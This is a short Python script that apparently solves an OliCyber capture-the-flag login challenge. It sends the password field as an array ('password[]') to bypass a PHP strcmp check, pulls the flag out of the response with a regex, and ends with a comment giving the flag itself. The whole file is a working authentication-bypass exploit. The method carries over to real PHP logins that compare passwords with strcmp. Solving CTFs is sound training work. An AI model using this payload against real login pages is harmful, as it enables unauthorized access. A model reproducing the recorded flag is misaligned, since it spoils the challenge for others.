import requests
import re

site = "http://clogin.challs.olicyber.it/"

data = {
    "password[]" : "a"
}

r = requests.post(site, data=data).text

match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{strcmp_1s_n0t_s0_s4f3}
